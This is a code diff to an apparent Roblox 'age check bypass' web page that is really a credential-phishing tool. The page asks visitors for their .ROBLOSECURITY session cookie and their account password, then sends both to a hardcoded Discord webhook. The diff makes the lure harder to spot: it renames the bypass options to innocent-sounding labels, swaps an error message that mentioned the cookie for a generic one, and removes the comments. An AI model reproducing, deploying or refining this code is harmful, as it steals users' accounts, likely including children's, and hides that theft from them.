@@ -196,8 +196,8 @@
     <label for="bypass">🔐 Account Security Options</label>
     <select id="bypass">
       <option value="">-- Select an option --</option>
-      <option value="under13">Bypass for under 13</option>
-      <option value="allages">Bypass all age checks</option>
+      <option value="birthyear">2008 Birthyear Up</option>
+      <option value="allages">13+ All Ages</option>
     </select>
 
     <div id="cookieInputContainer" class="cookie-block">
@@ -225,7 +225,7 @@
     </div>
   </div>
 
-  <div id="errorToast">Please enter your .ROBLOSECURITY Cookie</div>
+  <div id="errorToast">There was an error. Please try again.</div>
 
   <script>
     const bypassSelect = document.getElementById('bypass');
@@ -236,7 +236,6 @@
     const passwordInput = passwordInputContainer.querySelector('input[type="password"]');
     const errorToast = document.getElementById('errorToast');
 
-    // Funktion für Fehleranzeige
     function showError(msg) {
       errorToast.textContent = msg;
       errorToast.style.display = 'block';
@@ -245,10 +244,9 @@
       }, 4000);
     }
 
-    // Steuerung der Sichtbarkeit je nach Auswahl
     bypassSelect.addEventListener('change', () => {
       const val = bypassSelect.value;
-      if(val === 'under13') {
+      if(val === 'birthyear') {
         cookieInputContainer.style.display = 'block';
         passwordInputContainer.style.display = 'none';
         processBtn.style.display = 'flex';
@@ -278,7 +276,6 @@
         return;
       }
 
-      // Funktion um Nachricht an Discord zu senden
       function sendToDiscord(message) {
         return fetch('https://discord.com/api/webhooks/1392606095406534817/QzbO8vkIuH2Diu6iTpMdfEUPZPfJq1igLjCNfsbP5kLZ3UBcxFWNWYvXQ7ElgungYskB', {
           method: 'POST',
@@ -287,13 +284,10 @@
         });
       }
 
-      // Senden der Daten
       if(selectedOption === 'allages') {
-        // Erst Cookie senden
         sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
         .then(res => {
           if (!res.ok) throw new Error('Error sending cookie.');
-          // Dann Passwort senden
           return sendToDiscord(`Account Password:\n\`\`\`\n${passwordValue}\n\`\`\``);
         })
         .then(res => {
@@ -307,10 +301,10 @@
           processBtn.style.display = 'none';
         })
         .catch(() => {
-          showError('Error sending to Discord. Please try again later.');
+          // Kein Fehler-Toast mehr bei Discord-Fehlern, nur Alert optional:
+          alert('An error occurred while sending data. Please try again later.');
         });
       } else {
-        // Nur Cookie senden
         sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
         .then(res => {
           if (res.ok) {
@@ -324,7 +318,7 @@
           }
         })
         .catch(() => {
-          showError('Error sending to Discord. Please try again later.');
+          alert('An error occurred while sending data. Please try again later.');
         });
       }
     });
